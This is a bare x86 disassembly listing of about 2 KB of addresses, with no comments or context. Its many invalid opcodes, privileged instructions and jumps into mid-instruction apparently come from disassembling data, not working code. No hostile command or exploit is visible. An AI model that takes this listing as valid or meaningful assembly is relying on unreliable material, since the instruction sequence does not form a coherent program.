  4103f7:	jge    0x41042c
  4103f9:	data16 data16 xor al,0x5d
  4103fd:	data16 data16 jne 0x4103f9
  410401:	mov    edi,DWORD PTR [ebx]
  410403:	fdiv   QWORD PTR [edx+0x7d]
  410406:	data16 data16 jge 0x41043e
  41040a:	mov    ebx,0x758a66
  41040f:	mov    esi,0x667233
  410414:	pop    ebp
  410415:	or     BYTE PTR [esi+0x0],ah
  410418:	clc    
  410419:	mov    edi,DWORD PTR [ebx]
  41041b:	lock ja 0x4103a9
  41041e:	(bad)  
  410420:	jge    0x410419
  410422:	invd   
  410424:	pop    ebp
  410425:	add    BYTE PTR [ebx],al
  410427:	(bad)  
  410428:	cmp    di,WORD PTR [ebp+0xf]
  41042c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  410430:	mov    bx,WORD PTR [ebp-0x10]
  410434:	pop    bp
  410436:	fbstp  TBYTE PTR [ebx]
  410438:	test   DWORD PTR [ebx],eax
  41043a:	add    BYTE PTR [ebx],bh
  41043c:	add    BYTE PTR [esi+0x7d],ah
  41043f:	jge    0x4103cc
  410441:	data16 in al,dx
  410443:	pop    ebp
  410444:	stc    
  410445:	bsf    ecx,DWORD PTR [ebp+0x6632009d]
  41044c:	mov    edi,ebx
  41044e:	in     al,dx
  41044f:	test   BYTE PTR [ebp+0x0],bh
  410452:	mov    eax,DWORD PTR [eax]
  410454:	call   0xbd3dfde4
  410459:	inc    eax
  41045a:	popf   
  41045b:	add    BYTE PTR [edx],dh
  41045d:	mov    bx,di
  410460:	call   0x8b4981f0
  410465:	add    ebp,esp
  410467:	mov    bx,di
  41046a:	jnp    0x410492
  41046c:	mov    DWORD PTR [ebx+0x407df808],ecx
  410472:	mov    eax,DWORD PTR [eax]
  410474:	call   0x7c3c8fdf
  410479:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41047f:	data16 data16 fistp WORD PTR [ebp+0xe]
  410484:	xor    DWORD PTR [edi-0x48fff7aa],0xfb66f403
  41048e:	fisttp WORD PTR [ecx-0x7401f77b]
  410494:	(bad)  
  410495:	cld    
  410496:	jne    0x4104d8
  410498:	xor    eax,DWORD PTR [eax]
  41049a:	mov    esp,DWORD PTR [esi-0x10]
  41049d:	sti    
  41049e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4104a5:	data16 adc bl,bh
  4104a8:	push   ebp
  4104a9:	xor    ecx,DWORD PTR es:[ebx+0x40e4f88b]
  4104b0:	mov    WORD PTR [eax],es
  4104b2:	popf   
  4104b3:	data16 xor bh,bl
  4104b6:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4104bc:	mov    esp,DWORD PTR [esi-0x14]
  4104bf:	fisttp WORD PTR [ebx-0x3748a9f2]
  4104c5:	or     al,0x2b
  4104c7:	mov    bh,0xba
  4104c9:	hlt    
  4104ca:	mov    bh,bl
  4104cc:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4104d2:	dec    esi
  4104d3:	or     al,0x0
  4104d5:	mov    edi,DWORD PTR [ebx]
  4104d7:	or     BYTE PTR [ebp+0x3b],dh
  4104da:	mov    ecx,DWORD PTR [edi]
  4104dc:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4104e2:	xor    al,0xd8
  4104e4:	pop    bp
  4104e6:	lock xor esi,DWORD PTR [ebx]
  4104e9:	lea    esp,[esi+0x1f]
  4104ec:	icebp  
  4104ed:	jb     0x4104f3
  4104ef:	add    al,al
  4104f1:	jge    0x4104ff
  4104f3:	mov    eax,eax
  4104f5:	fsubr  st,st(3)
  4104f7:	pop    ebp
  4104f8:	mov    esi,DWORD PTR [ebx]
  4104fa:	in     al,0x8d
  4104fc:	rcr    DWORD PTR [edi],0xc2
  4104ff:	jb     0x41055f
  410501:	add    cl,cl
  410503:	jge    0x410511
  410505:	mov    edx,DWORD PTR [ebp-0x20]
  410508:	in     al,dx
  410509:	pop    ebp
  41050a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  41050f:	cmp    di,WORD PTR [ebp+0x0]
  410513:	mov    ebp,DWORD PTR [ebx]
  410515:	fdivr  QWORD PTR [esi+0x668a5d]
  41051b:	cmp    al,0x33
  41051d:	mov    si,0x4e7d
  410521:	mov    eax,DWORD PTR [eax]
  410523:	lock inc ebp
  410525:	mov    esi,DWORD PTR [eax+ecx*1]
  410528:	pushf  
  410529:	idiv   DWORD PTR [edx-0x7ff7af8]
  41052f:	(bad)  
  410530:	cmp    edi,DWORD PTR [ebx]
  410532:	je     0x410543
  410534:	push   ebx
  410535:	loopne 0x410546
  410537:	dec    ecx
  410539:	mov    esp,DWORD PTR [ebx-0x1c]
  41053c:	int    0xf1
  41053e:	mov    esi,0x703084d
  410543:	movlhps xmm6,xmm1
  410546:	add    BYTE PTR [ebp+0x66],dh
  410549:	jmp    0x410516
  41054b:	mov    eax,DWORD PTR [ebx]
  41054d:	lock push ebp
  41054f:	ror    DWORD PTR [ebp-0x2972feb3],1
  410555:	or     bh,dl
  410557:	jb     0x410557
  410559:	add    BYTE PTR [ebx-0x1a7487b3],cl
  41055f:	loopne 0x410561
  410561:	jne    0x410569
  410563:	data16 add BYTE PTR [esi+eiz*2],dh
  410567:	mov    ecx,ebx
  410569:	inc    ax
  41056b:	icebp  
  41056c:	add    BYTE PTR [eax+0x66],al
  41056f:	add    bl,cl
  410571:	mov    dx,0xf2
  410575:	mov    edx,0x66cb0066
  41057a:	enter  0x4df1,0x19
  41057e:	pop    edi
  41057f:	jne    0x410502
  410581:	mov    esi,DWORD PTR [eax+ebp*8]
  410584:	pushf  
  410585:	mov    esi,DWORD PTR [edi+esi*2+0x33]
  410589:	sub    ecx,DWORD PTR [ebp-0x1a0db79a]
  41058f:	cmp    eax,DWORD PTR [eax]
  410591:	jne    0x41055c
  410593:	xor    edx,DWORD PTR [ebp-0x15]
  410596:	in     al,dx
  410597:	xor    edx,DWORD PTR [esi+0x40]
  41059a:	mov    DWORD PTR [edi],0x338545fc
  4105a0:	clc    
  4105a1:	add    esi,DWORD PTR ds:0xe85b9c5f
  4105a7:	ret    0xff
  4105aa:	dec    DWORD PTR [ebx-0x74f8ae08]
  4105b0:	ss push esi
  4105b2:	dec    eax
  4105b3:	push   es
  4105b4:	jle    0x4105b6
  4105b6:	popa   
  4105b7:	data16 (bad) 
  4105b9:	into   
  4105ba:	arpl   WORD PTR [eax-0x33],ax
  4105bd:	add    BYTE PTR [ecx+0x7ce0866],bh
  4105c3:	mov    edx,0xc7000066
  4105c8:	push   es
  4105c9:	cld    
  4105ca:	add    BYTE PTR [ebp+0x35c3f866],al
  4105d0:	inc    eax
  4105d1:	pushf  
  4105d2:	add    BYTE PTR [esi+0x66],ah
  4105d5:	into   
  4105d6:	ret    
  4105d7:	pop    ebp
  4105d8:	push   0x66b70057
  4105dd:	mov    edi,0xff038dc3
  4105e2:	jne    0x41063a
  4105e4:	lea    edx,[ecx+0x1]
  4105e7:	mov    ebx,0xd64ff1
  4105ec:	sar    DWORD PTR [ebx],1
  4105ee:	test   BYTE PTR [ebp+0x3a],dh
  4105f1:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4105f5:	push   edi
  4105f6:	xor    BYTE PTR [ebx],0x36
  4105f9:	mov    esi,ebx
  4105fb:	xor    eax,DWORD PTR [eax-0x3c73819a]
  410601:	cmp    al,BYTE PTR [ebp+0x64]
  410604:	pop    ebx
  410605:	mov    ebx,0x9c3b34
  41060a:	je     0x410637
  41060c:	xor    edi,DWORD PTR [ebx+0x668a33]
  410612:	mov    WORD PTR [ebx],?
  410614:	cmp    bh,BYTE PTR [ebx+0x8b4e64]
  41061a:	pop    edi
  41061b:	cmp    ecx,ecx
  41061d:	jne    0x410674
  41061f:	mov    ebp,esp
  410621:	cld    
  410622:	push   esi
  410623:	pop    ebx
  410624:	inc    ebp
  410625:	stc    
  410626:	xor    al,0x85
  410628:	pushf  
  410629:	clc    
  41062a:	mov    esi,0xf8ce8509
  41062f:	test   dl,dl
  410631:	cmp    al,0xff
  410633:	fs pop si
  410636:	or     bl,al
  410638:	push   es
  410639:	mov    eax,DWORD PTR [eax]
  41063b:	push   ecx
  41063c:	push   di
  41063e:	retf   0x4045
  410641:	xor    al,0x0
  410643:	pushf  
  410644:	mov    si,0x85ca
  410648:	mov    edx,0x665b00f8
  41064d:	dec    edx
  41064f:	mov    edx,DWORD PTR [edi-0x76]
  410652:	push   edi
  410653:	add    al,0xb7
  410655:	xor    al,0xba
  410657:	cmp    al,0x8d
  410659:	je     0x41065a
  41065b:	mov    edx,DWORD PTR [esi-0x46]
  41065e:	push   ecx
  41065f:	lea    edi,[ebx+0x564fff]
  410665:	push   ecx
  410666:	cmp    edx,DWORD PTR [ebx+0x75]
  410669:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41066f:	add    BYTE PTR [ebx],dh
  410671:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410677:	add    BYTE PTR [ebx+esi*1+0x4f64bb3a],cl
  41067e:	mov    ebx,0x3b3b00
  410683:	jne    0x4106b0
  410685:	mov    DWORD PTR [ebx+0x728afc],edi
  41068b:	xor    esi,DWORD PTR [ebx]
  41068d:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410693:	push   edi
  410694:	cmp    esp,ebp
  410696:	jne    0x410698
  410698:	sbb    DWORD PTR [eax],0x8085c3fc
  41069e:	clc    
  41069f:	dec    eax
  4106a0:	pop    ebx
  4106a1:	sti    
  4106a2:	add    eax,0xeb8bc075
  4106a7:	cld    
  4106a8:	xor    edi,DWORD PTR ds:0xf8c3855e
  4106ae:	mov    ecx,DWORD PTR [ecx+edx*2]
  4106b1:	rol    DWORD PTR [ebp-0x37],0xf
  4106b5:	mov    DWORD PTR [eax],ecx
  4106b7:	inc    edi
  4106b8:	(bad)  
  4106b9:	in     eax,0xfa
  4106bb:	add    bh,bh
  4106bd:	(bad)  
  4106be:	mov    esi,0xc38a5e
  4106c3:	mov    esi,DWORD PTR [ebx]
  4106c5:	push   ecx
  4106c6:	mov    edi,0xfc4ec7
  4106cb:	test   DWORD PTR [ebp-0x8],edx
  4106ce:	xor    ax,0x9cc7
  4106d2:	sub    ebp,eax
  4106d4:	inc    ebp
  4106d5:	(bad)  
  4106d6:	sub    edi,edi
  4106d8:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4106de:	inc    ebp
  4106df:	add    BYTE PTR [esi+0x2b],ah
  4106e2:	or     bh,BYTE PTR [edx+0xf8ac2]
  4106e8:	cmp    al,0x33
  4106ea:	mov    edi,DWORD PTR [edx+0xfa4e81]
  4106f0:	(bad)  
  4106f1:	cmp    esi,DWORD PTR [ebx]
  4106f3:	je     0x4106ad
  4106f5:	push   ebx
  4106f6:	dec    esi
  4106f7:	str    ecx
  4106fa:	cmp    esp,DWORD PTR [ebx+0x75]
  4106fd:	int    0x33
  4106ff:	mov    edi,0x789085f
  410704:	mov    ebp,DWORD PTR [eax-0x4]
  410707:	add    cl,cl
  410709:	data16 add al,0xcb
  41070c:	push   ebp
  41070d:	add    ebp,esp
  41070f:	jne    0x4106fd
  410711:	(bad)  
  410712:	mov    DWORD PTR [ecx],0xd685f7ec
  410718:	clc    
  410719:	xlat   BYTE PTR ds:[ebx]
  41071a:	inc    ebp
  41071b:	mov    esi,DWORD PTR [edx]
  41071d:	push   eax
  41071e:	pushf  
  41071f:	in     eax,0x8b
  410721:	add    ah,ch
  410723:	push   es
  410724:	push   esi
  410725:	add    BYTE PTR [ecx+0x66],dl
  410728:	add    eax,0x4072cb
  41072d:	add    BYTE PTR [ebp+0x66],al
  410730:	(bad)  
  410731:	retf   
  410732:	lock mov edx,0x66f80085
  410738:	inc    ebp
  410739:	retf   
  41073a:	xor    eax,ecx
  41073c:	pushf  
  41073d:	jge    0x410706
  41073f:	xor    al,0xfc
  410741:	pushf  
  410742:	test   DWORD PTR [edi-0x8],ebx
  410745:	je     0x41078c
  410747:	xor    esi,DWORD PTR ds:0x7020840
  41074d:	ror    BYTE PTR [ebp-0x37],0x8d
  410751:	push   ebp
  410752:	add    esp,ebp
  410754:	jb     0x4106e1
  410756:	add    BYTE PTR [eax],cl
  410758:	dec    ebp
  410759:	mov    bh,0x81
  41075b:	push   esi
  41075c:	push   esi
  41075d:	adc    DWORD PTR [ecx-0x3c],0x409dff81
  410764:	xor    al,BYTE PTR [eax]
  410766:	mov    edx,DWORD PTR [edi+0x10]
  410769:	(bad)  
  41076a:	scas   eax,DWORD PTR es:[edi]
  41076b:	mov    edx,0x890f003b
  410770:	in     eax,dx
  410771:	cld    
  410772:	add    BYTE PTR [ebx],bh
  410774:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410778:	dec    ebp
  410779:	or     BYTE PTR [ebx],ch
  41077b:	ret    0x458b
  41077e:	lock jmp 0x410772
  410781:	mov    ecx,DWORD PTR [eax]
  410783:	or     BYTE PTR [edi],al
  410785:	mov    ecx,eax
  410787:	xor    DWORD PTR [edx+0x2],0x0
  41078b:	mov    bh,0xc1
  41078d:	adc    BYTE PTR [eax],dh
  41078f:	iret   
  410790:	inc    ebp
  410791:	mov    DWORD PTR [ebx],0x4dfff8c4
  410797:	inc    BYTE PTR [ebx]
  410799:	mov    edx,0x661100f8
  41079e:	adc    al,bh
  4107a0:	dec    ecx
  4107a1:	fisttp WORD PTR [ecx+0x456604c0]
  4107a7:	add    dh,BYTE PTR ds:0x75e0845
  4107ad:	ret    0x4d
  4107b0:	lea    ecx,[ebx+0x18728301]
  4107b6:	add    BYTE PTR [ebp+0x45],al
  4107b9:	xor    eax,0xc7009ce9
  4107be:	add    al,ch
  4107c0:	inc    ebp
  4107c1:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4107c7:	xor    eax,0x781084d
  4107cc:	push   esi
  4107cd:	popf   
  4107ce:	push   ecx
  4107cf:	xor    al,BYTE PTR [ecx+0x32f89d89]
  4107d5:	inc    ebp
  4107d6:	cmp    edi,DWORD PTR ds:0xc78b9c76
  4107dc:	or     ah,dh
  4107de:	inc    ebp
  4107df:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4107e5:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4107eb:	in     al,dx
  4107ec:	hlt    
  4107ed:	push   esi
  4107ee:	push   esi
  4107ef:	push   ecx
  4107f0:	push   ecx
  4107f1:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4107f7:	popf   
  4107f8:	popf   
  4107f9:	xor    dh,BYTE PTR [edx]
  4107fb:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  410801:	or     BYTE PTR [ebp+0x7],al
  410804:	mov    eax,ecx
  410806:	clc    
  410807:	jb     0x4107ca
  410809:	add    BYTE PTR [ebp+0x55],cl
  41080c:	or     DWORD PTR [edi],0xc251d156
  410812:	add    DWORD PTR [ebx+0x32009d],0x8b76453b
  41081c:	mov    edi,eax
  41081e:	or     cl,al
  410820:	inc    ebp
  410821:	dec    ebp
  410822:	mov    eax,DWORD PTR [ecx+0x514d560c]
  410828:	or     WORD PTR [ecx],0x899d
  41082d:	xor    cl,BYTE PTR [ebx+0x5676fc3b]
  410833:	mov    edx,DWORD PTR [ecx+0x8]
  410836:	mov    eax,DWORD PTR [ebp-0x8]
  410839:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb263]
  410840:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  410846:	inc    ebp
  410847:	dec    eax
  410848:	add    ecx,DWORD PTR [ebx+0x564df0f8]
  41084e:	add    edx,DWORD PTR [ecx-0x8]
  410851:	mov    ecx,DWORD PTR [ecx]
  410853:	clc    
  410854:	or     BYTE PTR [ebp+eax*2+0x4532409d],al
  41085b:	mov    ecx,ebp
  41085d:	clc    
  41085e:	(bad)  
  41085f:	popf   
  410860:	inc    DWORD PTR [eax]
  410862:	ret    0x8b
  410865:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  41086b:	mov    edi,esp
  41086d:	hlt    
  41086e:	test   ecx,esi
  410870:	clc    
  410871:	or     BYTE PTR [ebp+0x7],al
  410874:	xor    al,cl
  410876:	pushf  
  410877:	jb     0x4108ac
  410879:	add    BYTE PTR [eax-0x3f],al
  41087c:	inc    eax
  41087d:	daa    
  41087e:	inc    ebp
  41087f:	inc    ebp
  410880:	xor    eax,0x7f80803
  410885:	dec    ebp
  410886:	popf   
  410887:	add    esi,DWORD PTR [edx]
  410889:	clc    
  41088a:	cmp    DWORD PTR [ecx],ecx
  41088c:	or     al,0x8
  41088e:	add    al,BYTE PTR [ebp+0x2c]
  410891:	xor    eax,0x7350845
  410896:	or     BYTE PTR [ebp+0x7],cl
  410899:	lea    ebx,[ebp-0x748dcdff]
  41089f:	add    BYTE PTR [eax*2-0x74b21438],cl
  4108a6:	mov    edx,DWORD PTR [eax]
  4108a8:	cld    
  4108a9:	dec    ebp
  4108aa:	push   esi
  4108ab:	sub    edx,DWORD PTR [ecx-0x75]
  4108ae:	add    eax,0xf172fc
  4108b3:	or     BYTE PTR [ebp+0x7],cl
  4108b6:	add    eax,ecx
  4108b8:	or     al,0x72
  4108ba:	add    DWORD PTR [eax],eax
  4108bc:	mov    ebx,0x29c2c1
  4108c1:	inc    ebp
  4108c2:	mov    eax,DWORD PTR [ebx]
  4108c4:	cmp    eax,0x3004d1c
  4108ca:	xbegin 0x66c694c4
  4108d0:	clc    
  4108d1:	or     BYTE PTR [ebp+0x45],al
  4108d4:	xor    dh,BYTE PTR ds:0x78b089c
  4108da:	adc    BYTE PTR [ebp+0x45],cl
  4108dd:	lea    eax,[ebp+0x33727501]
  4108e3:	add    cl,ch
  4108e5:	inc    ebp
  4108e6:	add    bl,ch
  4108e8:	add    BYTE PTR [ebx+0x45850845],cl
  4108ee:	je     0x41087b
  4108f0:	push   ebx
  4108f1:	or     al,0x85
  4108f3:	dec    ebp
  4108f4:	std    
  4108f5:	mov    bh,bh
  4108f7:	mov    BYTE PTR [ebp-0x75],al
  4108fa:	mov    edi,eax
  4108fc:	or     al,0x89
  4108fe:	inc    ebp
  4108ff:	clc    
  410900:	mov    esp,esp
  410902:	hlt    
  410903:	call   DWORD PTR [edi-0x37]
  410906:	push   esi
  410907:	or     al,0x51
  410909:	push   ebp
  41090a:	xor    ebp,esp
  41090c:	mov    esi,0x457251
  410911:	xor    eax,0xc7459cc6
  410916:	mov    edi,eax
  410918:	or     al,0x85
  41091a:	add    al,bh
  41091c:	inc    eax
  41091e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  410922:	or     ah,bh
  410924:	inc    eax
  410925:	push   esi
  410926:	jmp    0x410979
  410928:	mov    eax,DWORD PTR ds:0xe8720c
  41092e:	mov    DWORD PTR [ebp-0x8],eax
  410931:	jne    0x410978
  410933:	jmp    0x4108c0
  410935:	mov    ebp,DWORD PTR [eax]
  410937:	clc    
  410938:	retf   0xff56
  41093b:	push   ecx
  41093c:	mov    DWORD PTR ds:0x757210,eax
  410942:	mov    ecx,DWORD PTR [ebp-0x4]
  410945:	sub    esp,DWORD PTR [ebx-0x77]
  410948:	dec    DWORD PTR [eax*4-0x74ca8abb]
  41094f:	or     ah,bh
  410951:	pop    es
  410952:	ds popf 
  410954:	push   DWORD PTR [edx]
  410956:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  41095c:	(bad)  
  41095d:	mov    bh,bh
  41095f:	jmp    0x41094d
  410961:	leave  
  410962:	jne    0x41096c
  410964:	call   0x2e02be
  410969:	in     al,dx
  41096a:	dec    ebp
  41096b:	add    dh,BYTE PTR [ebx]
  41096d:	add    BYTE PTR [ebx],al
  41096f:	inc    ebp
  410970:	cmp    esi,DWORD PTR ds:0xc78b9c74
  410976:	or     al,0xf0
  410978:	add    BYTE PTR [ebp+0x458bf845],al
  41097e:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410984:	adc    al,0x7
  410986:	enter  0x9fc0,0xa5
  41098a:	rol    BYTE PTR [eax],0x5e
  41098d:	mov    ecx,ecx
  41098f:	or     al,0xc
  410991:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410998:	jmp    0x410999
  41099a:	push   ebp
  41099b:	mov    esp,ebp
  41099d:	cld    
  41099e:	inc    ebp
  41099f:	inc    ebp
  4109a0:	or     DWORD PTR [ecx+0x457dec10],0x0
  4109a7:	push   esi
  4109a8:	push   esi
  4109a9:	mov    edi,0x7af080f
  4109ae:	add    bh,al
  4109b0:	test   DWORD PTR [ebp+0x3a7320f],ebx
  4109b6:	add    BYTE PTR [ecx+0x4540100f],cl
  4109bc:	mov    ebp,eax
  4109be:	mov    ebp,edi
  4109c0:	lock call edx
  4109c3:	fcom   DWORD PTR [ebp+0x45]
  4109c6:	mov    eax,0x148a8b
  4109cb:	push   ecx
  4109cc:	enter  0xc145,0x83
  4109d0:	cmp    ecx,DWORD PTR [eax]
  4109d2:	add    BYTE PTR [ebp+0x4d],al
  4109d5:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  4109db:	call   0xffa1054a
  4109e0:	cmp    eax,DWORD PTR [ebp-0xc]
  4109e3:	jmp    DWORD PTR [eax+edx*1-0x4e]
  4109e7:	push   ebp
  4109e8:	(bad)  
  4109e9:	call   0x3207ed
  4109ee:	mov    bh,0xdb
  4109f0:	cld    
  4109f1:	or     BYTE PTR [ebp+0x45],bl
  4109f4:	(bad)  
  4109f5:	call   0xff7b0685
  4109fa:	add    al,BYTE PTR [ebp+0x37]
  4109fd:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  410a03:	jne    0x410a05
  410a05:	(bad)  
  410a06:	cmp    edi,esp
  410a08:	jne    0x410a3b
  410a0a:	mov    edi,edi
  410a0c:	or     BYTE PTR [ebx-0x307f0b49],cl
  410a12:	pop    ds
  410a13:	into   
  410a14:	je     0x4109d7
  410a16:	mov    ebx,DWORD PTR [esi]
  410a18:	or     BYTE PTR [ebp-0x49],al
  410a1b:	mov    esp,DWORD PTR [esi-0x77]
  410a1e:	mov    esi,0x6451f0c
  410a23:	mov    eax,DWORD PTR [eax]
  410a25:	or     al,0x66
  410a27:	sar    bl,0x3b
  410a2a:	xor    esi,DWORD PTR [ebp+0x66]
  410a2d:	xor    ecx,edi
  410a2f:	pop    edi
  410a30:	adc    bl,BYTE PTR [ebx+0x7e]
  410a33:	ret    0xff
  410a36:	cld    
  410a37:	inc    ebp
  410a38:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  410a3e:	cld    
  410a3f:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  410a46:	push   0xffffff83
  410a48:	pop    edi
  410a49:	or     BYTE PTR [ebp+0x53],dh
  410a4c:	xorps  xmm1,xmm2
  410a4f:	test   BYTE PTR [eax+eax*1],bh
  410a52:	add    BYTE PTR [eax],al
  410a54:	adc    eax,eax
  410a56:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  410a5e:	jmp    DWORD PTR [eax]
  410a60:	ror    al,0x5e
  410a63:	inc    ebp
  410a64:	leave  
  410a65:	xor    ecx,DWORD PTR [eax]
  410a67:	and    DWORD PTR [ebx-0x3ebf0708],ecx
  410a6d:	add    ah,al
  410a6f:	xor    edi,edi
  410a71:	xor    DWORD PTR [ebx],0x66003306
  410a77:	mov    DWORD PTR [ebp-0xc],ecx
  410a7a:	pcmpgtw mm0,mm0
  410a7d:	add    dl,ah
  410a7f:	leave  
  410a80:	mov    esi,DWORD PTR [eax-0x7d]
  410a83:	push   ax
  410a85:	dec    ebp
  410a86:	mov    esi,DWORD PTR [ebx-0x75]
  410a89:	lea    ebp,[eax-0x7c00ff06]
  410a8f:	xor    eax,DWORD PTR [eax]
  410a91:	sysret 
  410a93:	dec    ebp
  410a94:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410a9b:	push   WORD PTR [ecx+0x8]
  410a9f:	jne    0x410a62
  410aa1:	ud0    ecx,DWORD PTR [ecx]
  410aa4:	mov    edi,DWORD PTR [edx+0x660000ac]
  410aaa:	(bad)  
  410aab:	iret   
  410aac:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410ab3:	cli    
  410ab4:	inc    ebp
  410ab5:	cmp    al,0x8d
  410ab7:	add    BYTE PTR [esi+0x2d],ah
  410aba:	inc    ebp
  410abb:	pop    ebp
  410abc:	lea    ecx,[edi]
  410abe:	mov    dl,bh
  410ac0:	add    BYTE PTR [edi],cl
  410ac2:	mov    DWORD PTR [eax+eax*8],edi
  410ac5:	mov    ebx,0x3b87
  410aca:	add    BYTE PTR [ebx],ch
  410acc:	inc    ebp
  410acd:	data16 (bad) 
  410acf:	clc    
  410ad0:	int3   
  410ad1:	cmp    eax,DWORD PTR [eax]
  410ad3:	je     0x410a5e
  410ad5:	push   0xffffffc8
  410ad7:	pop    edi
  410ad8:	xchg   DWORD PTR [ebp+0x0],eax
  410adb:	data16 add BYTE PTR [ebp+0x45],cl
  410adf:	lea    cx,[ebp+0x10]
  410ae3:	jb     0x410ae5
  410ae5:	jmp    0x410a70
  410ae7:	call   eax
  410ae9:	clc    
  410aea:	xchg   DWORD PTR [edi+0x1],edi
  410aed:	mov    eax,DWORD PTR [eax]
  410aef:	or     BYTE PTR [ebp-0x49],al
  410af2:	lea    eax,[eax+0x74003154]
  410af8:	push   edi
  410af9:	inc    edx
  410afa:	jge    0x410afb
  410afc:	mov    DWORD PTR [edi],ecx
  410afe:	fdiv   DWORD PTR [edi-0x6]
  410b01:	inc    DWORD PTR [eax]
  410b03:	xor    edx,DWORD PTR [eax+0x5f]
  410b06:	xchg   DWORD PTR [ebx+0x1],ebx
  410b09:	ret    0x0
  410b0c:	xor    BYTE PTR [ebp-0x51],cl
  410b0f:	cmp    edi,0xf0ff89fa
  410b15:	data16 ror al,0x84
  410b19:	rol    BYTE PTR [eax],0x3b
  410b1c:	add    al,dh
  410b1e:	dec    eax
  410b1f:	xchg   esp,eax
  410b20:	push   ebx
  410b21:	jmp    0x410aae
  410b23:	push   ebp
  410b24:	add    esp,ebp
  410b26:	add    ebp,esp
  410b28:	mov    edx,DWORD PTR [edi+0x24]
  410b2b:	clc    
  410b2c:	dec    esi
  410b2d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  410b33:	cmp    BYTE PTR [ebx],al
  410b35:	jne    0x410ac0
  410b37:	xor    esp,eax
  410b39:	jmp    0x440cbc
  410b3e:	add    ebp,DWORD PTR [ecx+ecx*4]
  410b41:	jne    0x410b37
  410b43:	call   0xffcb089d
  410b48:	clc    
  410b49:	xchg   edi,eax
  410b4a:	sti    
  410b4b:	add    DWORD PTR [ebx],eax
  410b4d:	add    BYTE PTR [ebp+0x47],bl
  410b50:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  410b56:	pop    ebp
  410b57:	mov    DWORD PTR [esi-0x48],esi
  410b5a:	jmp    0x410ba3
  410b5c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  410b62:	(bad)  
  410b64:	cmp    al,0x0
  410b66:	cmp    eax,DWORD PTR [ebp+0x18]
  410b69:	lea    ebx,[ebp-0x56]
  410b6c:	jle    0x410b6e
  410b6e:	jae    0x410af9
  410b70:	mov    eax,esp
  410b72:	call   0xb900:0x8b005587
  410b79:	inc    ebp
  410b7a:	push   ebp
  410b7b:	lea    ecx,[ebp-0x27ff4f12]
  410b81:	mov    eax,edi
  410b83:	int3   
  410b84:	push   ebp
  410b85:	xchg   edi,eax
  410b87:	add    esp,ebp
  410b89:	add    BYTE PTR [eax],al
  410b8b:	inc    ebp
  410b8c:	add    BYTE PTR [ebp+0x8b3255],cl
  410b92:	cld    
  410b93:	mov    DWORD PTR [edx],edi
  410b95:	aam    0x75
  410b97:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410b9d:	mov    DWORD PTR [ebx-0x50],edx
  410ba0:	test   BYTE PTR [ebp-0x1],0xe8
  410ba4:	mov    eax,DWORD PTR [eax]
  410ba6:	hlt    
  410ba7:	add    al,al
  410ba9:	mov    eax,DWORD PTR ds:0x890045a8
  410baf:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410bb5:	inc    DWORD PTR [eax*2+0xf75854d]
  410bbc:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410bc2:	call   0x72976903
  410bc7:	je     0x410c27
  410bc9:	js     0x410c2a
  410bcb:	lock ret 0x7e
  410bcf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410bd5:	mov    edi,edi
  410bd7:	sbb    al,bl
  410bd9:	clc    
  410bda:	add    BYTE PTR [ebp-0x73],bh
  410bdd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410be3:	ror    BYTE PTR [eax],1
  410be5:	dec    ebp
  410be6:	xchg   ebp,eax
  410be7:	mov    edi,edi
  410be9:	in     al,0x8b
  410beb:	jge    0x410b76
  410bed:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410bf3:	clc    
  410bf4:	pop    esi
  410bf5:	fist   DWORD PTR [ebp+0x5d398b5d]
  410bfb:	clc    
  410bfc:	add    al,0x6e
  410bfe:	mov    eax,DWORD PTR [ebx]
  410c00:	mov    BYTE PTR [ebp+0x0],dl
  410c03:	mov    edx,DWORD PTR [ebx-0x20]
  410c06:	adc    esi,DWORD PTR [edi+0x5e005f40]
  410c0c:	add    eax,0x3b3b73
  410c11:	adc    al,0x89
  410c13:	pop    eax
  410c14:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410c18:	ret    0xf08
  410c1b:	cmp    al,0x2
  410c1d:	mov    DWORD PTR [edx+0x665500fc],edi
  410c23:	add    eax,ebx
  410c25:	add    esp,eax
  410c27:	sub    eax,eax
  410c29:	or     BYTE PTR [ecx-0x77f474bb],cl
  410c2f:	add    BYTE PTR [eax],al
  410c31:	mov    DWORD PTR [ebx-0x24],ebx
  410c34:	push   edi
  410c35:	push   ebp
  410c36:	clc    
